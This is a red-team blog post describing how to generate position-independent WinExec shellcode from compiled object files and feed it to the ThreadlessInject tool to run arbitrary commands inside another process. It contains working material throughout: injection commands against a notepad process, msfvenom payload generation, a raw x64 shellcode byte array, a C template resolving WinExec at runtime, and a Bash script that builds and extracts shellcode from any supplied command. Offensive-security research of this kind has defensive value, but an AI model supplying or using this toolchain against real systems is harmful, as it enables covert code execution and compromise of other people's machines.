---
layout: post
title: "Adopting Position Independent Shellcodes from Object Files in Memory for Threadless Injection"
date: 2023-02-14 05:00:00 +0300
author: snovvcrash
tags: [maldev, threadless-injection, function-stomping, shellcode-injection, shellcode-generation, pic, winexec, msfvenom]
---

In this blog I will describe a way to automate the generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @\_EthicalChaos\_).

<!--cut-->

[![banner.png](/assets/images/pic-generation-for-threadless-injection/banner.png)](/assets/images/pic-generation-for-threadless-injection/banner.png)
{:.center-image}

* TOC
{:toc}

## Function Stomping / Threadless Injection

One of the items from my endless TODO-list that I never crossed out was the topic of [Function Stomping](https://idov31.github.io/2022/01/28/function-stomping.html) by [Ido Veltzman](https://twitter.com/Idov31). Luckily, [Ceri Coburn](https://twitter.com/_EthicalChaos_) [presented](https://twitter.com/_EthicalChaos_/status/1624520767483310081) an awesome [research](https://github.com/CCob/ThreadlessInject/blob/master/Needles%20without%20the%20Thread.pptx) on Threadless Process Injection accompanying a ready-to-use [injector in C#](https://github.com/CCob/ThreadlessInject) which made me get back to that long-forgotten TODO.

## Pop-the-Calc Shellcode

While playing with ThreadlessInject and [porting](https://twitter.com/snovvcrash/status/1624944014263713796) it to the [DInvoke](https://github.com/TheWover/DInvoke) API, one of the obvious desires of mine was to test it with a different shellcode. As a Proof-of-Concept Ceri provides a classic [Pop-the-Calc](https://github.com/CCob/ThreadlessInject/blob/c41df117e74b3413a8ed12ba5882058057253aac/Program.cs#L73-L82) shellcode which works smoothly but may not be enough during a real engagement:

```powershell
Start-Process notepad; .\ThreadlessInject.exe -p (Get-Process notepad).Id -d kernel32.dll -e OpenProcess
```

[![threadless-inject-calc.png](/assets/images/pic-generation-for-threadless-injection/threadless-inject-calc.png)](/assets/images/pic-generation-for-threadless-injection/threadless-inject-calc.png)
{:.center-image}

Hackers looove popping calcs!
{:.quote}

Well, what will a hacker do to generate a shellcode? Summon `msfvenom`, of course:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o msf-calc.bin
```

Providing the `msf-calc.bin` shellcode to ThreadlessInject.exe with `-x` option expectedly results in exiting the target process:

```powershell
Start-Process notepad; .\ThreadlessInject.exe -x .\msf-calc.bin -p (Get-Process notepad).Id -d kernel32.dll -e OpenProcess
```

[![threadless-inject-msf.gif](/assets/images/pic-generation-for-threadless-injection/threadless-inject-msf.gif)](/assets/images/pic-generation-for-threadless-injection/threadless-inject-msf.gif)
{:.center-image}

Unwanted termination of parent process with MSF shellcode
{:.quote}

Changing the `EXITFUNC=` option during the generation process doesn't seem to be helpful:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=none -f raw -o msf-calc-none.bin
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=process -f raw -o msf-calc-process.bin
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o msf-calc-thread.bin
```

It's a [known](https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/) thing that MSF-exec payloads are better to be started from a fresh thread 'cause the shellcode doesn't treat the stack gently. Furthermore, a hint about the required shellcode behavior is kindly left by the author of ThreadlessInject [in the comments](https://github.com/CCob/ThreadlessInject/blob/master/Program.cs#L73):

```csharp
//x64 calc shellcode function with ret as default if no shellcode supplied
static byte[] x64 = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3 };
```

That is to say, the `ret` instruction should be supplied when the shellcode's job is done in order to return the execution flow back to the caller (i. e., [the assembly stub](https://github.com/CCob/ThreadlessInject/blob/c41df117e74b3413a8ed12ba5882058057253aac/Program.cs#L117)) as well as proper stack alignment should be performed with registers preserved. So let's take a look at both shellcodes side-by-side with objdump.

[![pop-the-calc-comparison.png](/assets/images/pic-generation-for-threadless-injection/pop-the-calc-comparison.png)](/assets/images/pic-generation-for-threadless-injection/pop-the-calc-comparison.png)
{:.center-image}

Comparing calc shellcodes
{:.quote}

As we can see no `ret` is observed within the MSF shellcode... Dunno whether the dynamic way of MSF generator puts the `CMD=` value onto the stack (via that `call rbp` instruction) does also negatively impacts our situation but we definitely don't get desired behavior – the parent process dies.

So what can we do about it?

## Where's the <strike>Detonator</strike>Generator?

Honestly, I don't know any other FOSS shellcode generator besides `msfvenom` so I started to google :man_shrugging: Btw, the builtin default shellcode for ThreadlessInject is as old as time and can be found in a numerous GitHub repos and [gists](https://gist.github.com/dmchell/51b8c040402e6f13bacbed317335daea#file-csinjcy-L35).

Among other things, I considered the following options:

* Look for other less-known open source shellcode generators for Windows x64 – failed due to a total lack of them (though [win-x86-shellcoder](https://github.com/ommadawn46/win-x86-shellcoder) seems to be a nice project for x86).
* Use an existing Pop-the-Calc `.asm` file as template for generating a WinExec shellcode with an arbitrary argument (command) – failed due me being lazy. Good examples of such 'static' calc shellcodes (with a static `lpCmdLine` argument for WinExec) are [win-exec-calc-shellcode](https://github.com/peterferrie/win-exec-calc-shellcode) and [x64win-DynamicNoNull-WinExec-PopCalc-Shellcode](https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode) by [Bobby Cooke](https://twitter.com/0xBoku).
* Play with popular PE → shellcode techniques like [sRDI](https://github.com/monoxgas/sRDI), [donut](https://github.com/TheWover/donut), [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode), etc.

While testing the 3rd option I came along this terrific article by [@KlezVirus](https://twitter.com/KlezVirus) – [From Process Injection to Function Hijacking](https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/) – which covers Function Stomping topic **in great depth** (one more blogpost in my TODOs).

As I was looking for a quick example to be used with ThreadlessInject, my attention was caught by one of the references to another blog of maldev magician [Chetan Nayak](https://twitter.com/NinjaParanoid) – [Executing Position Independent Shellcode from Object Files in Memory](https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/) – which we shall focus on further.

## PIC from Object Files

In his blog Chetan provides a way to build a C function with a small assembly stub for proper stack alignment and returning to the caller gracefully. With the ability to dynamically resolve exported symbols of WinExec (which resides within `kernel32.dll`) we can extract the opcodes from the compiled binary and use them as a Position Independent shellcode. That's exactly what we need!

Based on the given example of constructing the `getprivs` function I shall git clone his demo [repository](https://github.com/paranoidninja/PIC-Get-Privileges) and write a template to execute a command of my choice using WinExec:

```c
// template.c

#include "addresshunter.h"
#include <stdio.h>

typedef UINT(WINAPI* WINEXEC)(LPCSTR, UINT);

void exec() {
    UINT64 kernel32dll;
    UINT64 WinExecFunc;

    kernel32dll = GetKernel32();

    CHAR winexec_c[] = {'W','i','n','E','x','e','c', 0};
    WinExecFunc = GetSymbolAddress((HANDLE)kernel32dll, winexec_c);

    CHAR cmd_c[] = {'<CMD>'};
    ((WINEXEC)WinExecFunc)(cmd_c, 0);
}
```

Then with a bit of Bash magic for automation we get a working alternative for the `windows/x64/exec` MSF module:

```bash
#!/usr/bin/env bash

CMD=`echo "${1}" | grep -o . | sed -e ':a;N;$!ba;s/\n/\x27,\x27/g'`
CMD="${CMD//\\/\\\\\\\\}"
#echo $CMD

cat template.c | sed "s#<CMD>#${CMD}#g" > exec.c

nasm -f win64 adjuststack.asm -o adjuststack.o

x86_64-w64-mingw32-gcc exec.c -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o exec.o -Wl,-Tlinker.ld,--no-seh

x86_64-w64-mingw32-ld -s adjuststack.o exec.o -o exec.exe

echo -e `for i in $(objdump -d exec.exe | grep "^ " | cut -f2); do echo -n "\x$i"; done` > exec.bin

rm exec.exe exec.o exec.c adjuststack.o
```

Generate and execute:

```bash
./generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt'
```

[![threadless-inject-exec.png](/assets/images/pic-generation-for-threadless-injection/threadless-inject-exec.png)](/assets/images/pic-generation-for-threadless-injection/threadless-inject-exec.png)
{:.center-image}

Execution of customly generated shellcode
{:.quote}

Happy hacking!

## References

* [https://github.com/CCob/ThreadlessInject](https://github.com/CCob/ThreadlessInject)
* [https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/](https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/)
* [https://github.com/paranoidninja/PIC-Get-Privileges](https://github.com/paranoidninja/PIC-Get-Privileges)
* [https://idov31.github.io/2022/01/28/function-stomping.html](https://idov31.github.io/2022/01/28/function-stomping.html)
* [https://github.com/Idov31/FunctionStomping](https://github.com/Idov31/FunctionStomping)
* [https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/](https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/)
* [https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/](https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/)
* [https://github.com/ommadawn46/win-x86-shellcoder](https://github.com/ommadawn46/win-x86-shellcoder)
* [https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode](https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode)
